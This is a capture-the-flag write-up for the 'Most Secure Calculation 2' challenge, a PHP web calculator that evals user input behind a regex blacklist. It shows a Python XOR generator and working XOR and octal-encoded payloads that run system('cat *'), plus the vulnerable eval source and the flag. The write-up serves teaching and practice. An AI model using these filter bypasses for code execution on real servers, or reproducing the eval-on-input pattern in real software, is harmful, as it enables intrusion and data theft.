# Most Secure Calculation 2

*The version 2 calculator web app*

## Step 1, enumeration:
Viewing the source-code, we found a comment:
```html
Hi Selina, 
I learned about regex today. I have upgraded the previous calculator. Now its the most secure calculator ever.
The calculator accepts only numbers and symbols. 
I have hidden some interesting things in flag.txt and I know you can create an interesting equation to read that file.
```
Do enumeration again equation parameter, we know that this challenge:
**Blacklist characters**: all characters, $, <, >, =

## Step 2, exploit:
Ok, try to inject some special characters we get some error and know `eval()` function is using: 
```html
Result : Parse error: syntax error, unexpected ';' in /var/www/html/index.php(12) : eval()'d code on line 1
```

With blacklist characters this sound just like XOR string to bypass. Ok, i don't finished this challenge, i stick with XOR but it doesn't work and then i realize we can XOR: string ^ string = string, and not just 2 single character together. Ok, ye, ye leave me alone!!

**XOR string**:
**About XOR algorithm**: XOR is OR operation, (1 ^ 1 = 0 ; 0 ^ 0 = 0), (1 ^ 0 = 1), example:
```
a: 01100001
   ^(XOR)
b: 01100010
   -------
3: 00000011
```
When we XOR two string, characters will sequence XOR each other(abcd^abcd), but when one longer than the other, this will be: ab ^ abababa

**tool**: using `generate_xor.py` to convert characters to symbols.
```python
# bad_girls = $, any characters(\n), <, >, =
valid = r"0123456789!\"#%&'()*+,-./:;?@[]^_{}~`\\|"

def xor(a, b):
	return chr(ord(a) ^ ord(b))

payload = "system" # cat

flag = 0
one = ''
two = ''
for p in payload:
	for a in valid:
		for b in valid:
			if xor(a, b) == p:
				one += a; two += b
				flag = 1
				break
		if flag:
			flag = 0
			break

print(f"('{one}'^'{two}')")
```

**final payload**: after craft
```php
system(cat *) : ('393480'^'@@@@]]')(('8!4'^'[@@').' *')
```

**Octal encoding**:
More easy way, with *double quote*, we can using hex, octal encoding to bypass the filter, but hexdedimal prefix(ex: \x08), 'x' character is blocked so we can't used this.

Ok, let's use octal(number from 0 to 7, which is allowed) encoding.

**Reference**:
String literal in python: `https://stackoverflow.com/questions/50580002/what-does-a-backslash-mean-in-a-string-literal`: Using back slash to specify denote special type of string literals.

About `hexdecimal`, notice *hex identifier*: `https://learn.sparkfun.com/tutorials/hexadecimal/`
**Identifier**: 0x47DE, #FF7734, %20,\x0A, &#x	
	
**About octal prefix**: `077, 0o77, \077`

**payload**:
```php
system('cat *') : ("\163\171\163\164\145\155")("\143\141\164 *")
`cat *` : `\143\141\164 *`
```

**source-code**: `index.php`
```php
<?php
if (isset($_POST["equation"]) && !is_array($_POST["equation"])) {
    if (empty($_POST["equation"])) {
        echo "Please enter some eqation.";
    } else {
        if (preg_match_all("^[a-zA-Z\$\>\<\=]^", $_POST["equation"])) {
            echo "Oow ! Bad equation.";
        } else if (strlen($_POST["equation"]) >= 80) {
            echo "Oow ! You have entered an equation that is too big for me.";
        } else {
            echo "<h1> Result : <br>";
            eval("echo " . $_POST["equation"] . ";");
            echo "</h1>";
        }
    }
}

```
**flag**: `KCTF{sHoUlD_I_uSe_eVaL_lIkE_tHaT}`
